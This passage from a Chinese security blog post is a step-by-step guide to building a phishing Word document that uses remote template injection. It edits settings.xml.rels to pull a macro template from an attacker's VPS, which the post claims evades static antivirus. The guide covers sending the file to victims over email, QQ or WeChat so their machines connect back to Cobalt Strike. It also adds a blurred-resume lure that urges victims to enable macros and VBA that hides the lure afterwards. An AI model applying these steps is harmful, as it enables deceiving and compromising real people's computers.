title="1、将恶意文件上传到服务器vps"></a>1、将恶意文件上传到服务器vps</h2><p>首先我们制作一个带有宏代码的恶意模板文件，放置在vps上，并且通过python开启一个简易的http服务器</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/14.png" class=""><h2 id="2、构造恶意的docx钓鱼文件"><a href="#2、构造恶意的docx钓鱼文件" class="headerlink" title="2、构造恶意的docx钓鱼文件"></a>2、构造恶意的docx钓鱼文件</h2><p>打开word找一个任意的模板使用</p><p>这里我就通过录制宏，另存为1.dotm模板文件到Office模板目录下，自己制作一个模板</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/23.png" class=""><p>直接继续在开始一栏新建–导入之前做好的模板文件1.dotm</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/24.png" class=""><p>另保存为鱼摆摆.docx</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/25.png" class=""><p>然后再将文件后缀名改为.zip格式文件，并且进行解压缩</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/26.png" class=""><p>进入word文件夹中的_rels，找到settings.xml.rels文件，编辑这个文件，将其的target属性的值改为服务器的URL，修改为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">http://ip:port/模板文件.dotm?raw=true<br>或者是<br>http://域名/模板文件.dotm?raw=true<br>这里的地址也就是vps的地址<br></code></pre></td></tr></table></figure><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/27.png" class=""><p>完成之后，再将所有解压缩的文件再次进行压缩，随后点击修改后缀名为正常的docx文件，这种效果可以起到一定的免杀效果，因为是做了分离免杀，恶意的shellcode并没有放置在文件内部，文件中的内容代码都是正常的，杀软静态查杀是无法查杀到的。</p><p>这里附上杀软检测截图</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/28.png" class=""><h2 id="3、加载服务器上的恶意文件反弹shell"><a href="#3、加载服务器上的恶意文件反弹shell" class="headerlink" title="3、加载服务器上的恶意文件反弹shell"></a>3、加载服务器上的恶意文件反弹shell</h2><p>将最终生成的恶意文件——fish.docx用邮箱钓鱼、qq或微信文件发送给受害者，当受害者双击打开文件时，启用宏时，恶意代码会执行，目标主机会上线</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/12.png" class=""><h2 id="4、进阶伪装–背景虚拟化图片的覆盖"><a href="#4、进阶伪装–背景虚拟化图片的覆盖" class="headerlink" title="4、进阶伪装–背景虚拟化图片的覆盖"></a>4、进阶伪装–背景虚拟化图片的覆盖</h2><p>从之前的实验可以发现，启动world文件时，需要目标用户点击启用宏，才可以上线cs，但是做为稍微有一些安全防备的人员来说，可能并不会开启，所以不能够达到百分百的利用率，以下内容来自公众号Gamma实验室的内容，我们可以借此进行操作。</p><p>制作一份简历，或者直接从网上下载</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/29.png" class=""><p>打开美图秀秀，打开刚保存的图片，点击背景虚拟化，调整好虚拟化的程度，并且最好是那种若隐若现的感觉，然后加上一些说明内容，比如当前文件为公司重要文件，请打开宏查看全部内容。</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/30.png" class=""><p>然后设置图片尺寸为790，1120，为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本。我这里设置尺寸稍微大了点，不知是什么情况</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/31.png" class=""><p>然后保存，然后就可以看到效果了</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/32.png" class=""><p>为什么会设置成790x1120嘞，只是为了刚好覆盖word里面的文本，之后在world文本中直接插入图片</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/33.png" class=""><p>插入图片之后，再分别点击宏创建，和之前的步骤一样，将cs生成的宏代码复制粘贴，在Auto_Open（）函数首部编写代码，设置图片位置为0高度为0让宏运行后doc上图片消失，然后保存，office马就制作好了</p><img src="/2022/11/06/%E9%80%9A%E8%BF%87%E5%88%B6%E4%BD%9Cwrold%E5%AE%8F%E8%BF%9B%E8%A1%8C%E9%92%93%E9%B1%BC/34.png" class=""><p>设置代码为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Project.ThisDocument.Image1.Top = 0<br>Project.ThisDocument.Image1.Width = 0<br></code></pre></td></tr></table></figure><h1 id="三：其他思路"><a href="#三：其他思路" class="headerlink" title="三：其他思路"></a>三：其他思路</h1><p>如果是遇到wps的目标打开上述方法的文件是无法提示宏的，那么我们可能就需要另辟蹊径，但仅限于目前并未研究wps群体，所以后续有相关研究，在进行分享。</p>]]></content>
    
    
    
    <tags>
      
      <tag>apt/社工</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
